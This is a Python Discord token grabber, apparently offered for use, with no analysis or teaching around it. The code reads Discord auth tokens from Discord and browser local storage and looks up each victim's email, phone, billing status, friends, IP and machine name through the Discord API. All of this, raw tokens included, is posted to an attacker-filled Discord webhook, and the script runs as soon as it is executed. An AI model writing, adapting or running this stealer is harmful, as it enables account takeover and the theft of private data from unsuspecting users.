from sys import argv, exit
import os, re, base64
from json import loads, dumps
from threading import Thread
from time import sleep
import requests
import getpass
import time

PING_ME = True
LOCAL = ""
ROAMING = ""
cache_path = ""

def getwebhook():
    webhook = "" # <~~ YOUR DISCORD WEBHOOK TO SEND DATA TO
    return webhook

if os.name == "posix":
    LOCAL = f"/Users/{getpass.getuser()}/Library/Application Support"
    cache_path = ".cache~$"
    PATHS = {
        "Google Chrome"     : LOCAL + "/Google/Chrome/Default/",
        "Discord"           : LOCAL + "/discord/"
    }

elif os.name == "nt":
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    cache_path = os.getenv("TEMP") + "\\" + ".cache~$"
    PATHS = {
        "Discord"           : ROAMING + "\\Discord",
        "Discord Canary"    : ROAMING + "\\discordcanary",
        "Discord PTB"       : ROAMING + "\\discordptb",
        "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
        "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }

else:
    exit()


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getuserdata(token):
    try:
        res = requests.get("https://discordapp.com/api/v6/users/@me", headers=getheaders(token)).text
        return loads(res)
    except Exception as e:
        print(e)

def getip():
    ip = "N/A"
    try:
        ip = requests.get("https://api.ipify.org").text.strip()
    except Exception as e:
        pass
    return ip

def has_payment_methods(token):
    try:
        payment = loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)
        return payment
    except Exception as e:
        pass

def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
    try:
        requests.get(url)
    except:
        url = url[:-4]
    return url

def getfriends(token):
    try:
        friends = loads(requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token)).text)
        return friends
    except Exception as e:
        pass

def get_token(path):
    tokens = []
    path += "Local Storage/leveldb" # local storage dir path

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            #print(file_name)
            continue

        for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    #print("file:", file_name)
                    tokens.append(token)

    #print("tokens:", tokens, "\n\n")
    return tokens

def main():
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    names = ""

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in get_token(path):
            if token in checked or not len(token) > 0:
                continue

            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = base64.b64decode(token.split(".")[0].encode()).decode()
                except Exception as e:
                    print(e)
                if not uid or uid in working_ids:
                    continue

            user_data = getuserdata(token)
            if user_data:
                msg = ""
                if PING_ME:
                    msg += "@everyone"
                #print(user_data)
                try:
                    working.append(token)
                    working_ids.append(uid)
                    username = user_data["username"] + "#" + str(user_data["discriminator"])
                    user_id = user_data["id"]
                    avatar_id = user_data["avatar"]
                    avatar_url = getavatar(user_id, avatar_id)
                    locale = user_data.get("locale")
                    email = user_data.get("email")
                    phone = user_data.get("phone")
                    nitro = bool(user_data.get("premium_type"))
                    billing = bool(has_payment_methods(token))

                    friends = getfriends(token)
                    for friend in friends:
                        n = friend["user"].get("username")
                        d = friend["user"].get("discriminator")
                        fr = n + "#" + d
                        names += fr + "\n"

                    ip = getip()
                    pc_username = getpass.getuser()
                    pc_name = os.uname()[1]
                    embed = {
                        # light blue: 0x7289da
                        "color": 0x4667e0,
                        "fields": [
                            {
                                "name": "**Account Info**",
                                "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}\nCountry: {locale}',
                                "inline": True
                            },
                            {
                                "name": "**PC Info**",
                                "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                                "inline": True
                            },
                            {
                                "name": "**Friends**",
                                "value": names,
                                "inline": False
                            },
                            {
                                "name": "**Token**",
                                "value": token,
                                "inline": False
                            }
                        ],
                        "author": {
                            "name": f"{username} ({user_id})",
                            "icon_url": avatar_url
                        }
                    }
                    embeds.append(embed)
                except Exception as e:
                    pass
                    #print(e)


    new_token = False
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in open(cache_path, "r").read():
                file.write(token + "\n")
                new_token = True

    data = dumps({
        #https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png
        "content": msg,
        "embeds": embeds,
        "username": f"Token Grabber | {time.strftime('%H:%M:%S')}",
        "tts": True
    })

    if new_token == True:
        post_ = requests.post(getwebhook(), data, headers=getheaders())

main()
